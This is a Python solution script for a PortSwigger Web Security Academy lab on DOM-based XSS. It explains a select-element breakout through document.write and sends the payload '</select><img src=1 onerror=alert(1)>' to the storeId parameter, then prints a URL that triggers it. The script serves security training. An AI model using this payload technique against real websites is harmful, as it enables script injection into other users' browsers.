# Lab 10 — DOM XSS in document.write sink using location.search inside a select element
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
#
# Vulnerability: Stock check — storeId URL parameter
# Aim:           Perform DOM XSS that calls alert
#
# Technique:
#   The page JS writes a <select> using document.write() and injects storeId:
#     document.write('<option selected>' + storeId + '</option>');
#
#   Inside <select>, injected tags are treated as text — the browser ignores them.
#   Break out of <select> first, then inject a normal HTML tag:
#     storeId = </select><img src=1 onerror=alert(1)>
#
#   Result:
#     <select><option selected></select><img src=1 onerror=alert(1)>
#                              ↑ closes the select — now we're in normal HTML
#
# ⚠  DOM XSS — execution requires a browser. We verify raw reflection here.
#
# Usage: python xss_lab10.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "</select><img src=1 onerror=alert(1)>"

if __name__ == "__main__":
    banner()
    section("LAB 10 — DOM XSS: document.write IN <select> / storeId PARAM")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab10.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # The stock check feature is on the product page
    params = {"productId": "1", "storeId": PAYLOAD}
    print(f"  ➜  Sending storeId payload: {PAYLOAD}\n")
    r = session.get(f"{url}/product", params=params)

    check_reflection(r.text, PAYLOAD, "Select-break payload")

    print()
    print("  ➜  Open this URL in a browser to trigger JS execution:")
    print(f"     {r.url}")
    print("  ℹ  </select> escapes the context. document.write() inserts the img → onerror fires.")
